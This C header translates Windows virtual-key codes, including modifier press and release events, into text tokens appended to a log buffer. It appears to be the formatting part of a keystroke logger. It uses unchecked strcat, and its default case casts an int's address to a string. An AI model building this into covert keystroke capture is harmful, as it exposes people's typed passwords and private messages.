#ifndef KEYINTERPRETOR_H_INCLUDED
#define KEYINTERPRETOR_H_INCLUDED

void writeKey(int, char *, int);
void writeNumKeys(int, char *);

void writeKey(int key, char *buffer, int keyReleased){
    if((GetKeyState(VK_NUMLOCK) & 0x0001) && key >= 96 && key <=105 && !keyReleased){
        writeNumKeys(key, buffer);
        return;
    }
    switch(key){
    case 20:
        strcat(buffer, keyReleased ? "[CAPSLOCK-up]":"[CAPSLOCK]");
        break;
    case -96:
        strcat(buffer, keyReleased ? "[SHIFT-up]":"[SHIFT]");
        break;
    case -94:
        strcat(buffer, keyReleased ? "[CTRL-up]":"[CTRL]");
        break;
    case VK_RMENU:
        if(!keyReleased){
            strcat(buffer, "[ALT GR]");
        }
        break;
    case VK_LMENU:
        strcat(buffer, keyReleased ? "[ALT-up]":"[ALT]");
        break;
    case VK_DIVIDE:
        if(!keyReleased){
            strcat(buffer, "/");
        }
        break;
    case 8:
        if(!keyReleased){
            strcat(buffer, "[BACKSPACE]");
        }
        break;
    case 13:
        if(!keyReleased){
            strcat(buffer, "[ENTER]");
        }
        break;
    case 32:
        if(!keyReleased){
            strcat(buffer, "[SPACE]");
        }
        break;
    case -35:
        if(!keyReleased){
            strcat(buffer, "«");
        }
        break;
    case -37:
        if(!keyReleased){
            strcat(buffer, "'");
        }
        break;
    case -65:
        if(!keyReleased){
            strcat(buffer, "~");
        }
        break;
    case -70:
        if(!keyReleased){
            strcat(buffer, "[ACENTO]");
        }
        break;
    case VK_TAB:
        if(!keyReleased){
            strcat(buffer, "[TAB]");
        }
        break;
    case VK_ESCAPE:
        if(!keyReleased){
            strcat(buffer, "[ESC]");
        }
        break;
    case VK_HOME:
        if(!keyReleased){
            strcat(buffer, "[HOME]");
        }
        break;
    case VK_LEFT:
        if(!keyReleased){
            strcat(buffer, "[LEFT]");
        }
        break;
    case VK_RIGHT:
        if(!keyReleased){
            strcat(buffer, "[RIGHT]");
        }
        break;
    case VK_UP:
        if(!keyReleased){
            strcat(buffer, "[UP]");
        }
        break;
    case VK_DOWN:
        if(!keyReleased){
            strcat(buffer, "[DOWN]");
        }
        break;
    case -112:
        if(!keyReleased){
            strcat(buffer, "[NUMLOCK]");
        }
        break;
    case VK_ADD:
    case 187:
        if(!keyReleased){
            strcat(buffer, "[+]");
        }
        break;
    case 188:
    case -68:
        if(!keyReleased){
            strcat(buffer, "[,]");
        }
        break;
    case 189:
    case -67:
    case VK_SUBTRACT:
        if(!keyReleased){
            strcat(buffer, "[-]");
        }
        break;
    case 110:
    case -66:
    case 190:
        if(!keyReleased){
            strcat(buffer, "[.]");
        }
        break;
    case 106:
        if(!keyReleased){
            strcat(buffer, "*");
        }
        break;
    default:
        if(!keyReleased){
            strcat(buffer, (char *) &key);
        }
    }
}

void writeNumKeys(int key, char *buffer){
    switch (key) {
    case 96:
        strcat(buffer, "0");
        break;
    case 97:
        strcat(buffer, "1");
        break;
    case 98:
        strcat(buffer, "2");
        break;
    case 99:
        strcat(buffer, "3");
        break;
    case 100:
        strcat(buffer, "4");
        break;
    case 101:
        strcat(buffer, "5");
        break;
    case 102:
        strcat(buffer, "6");
        break;
    case 103:
        strcat(buffer, "7");
        break;
    case 104:
        strcat(buffer, "8");
        break;
    case 105:
        strcat(buffer, "9");
        break;
    }
}
#endif // KEYINTERPRETOR_H_INCLUDED
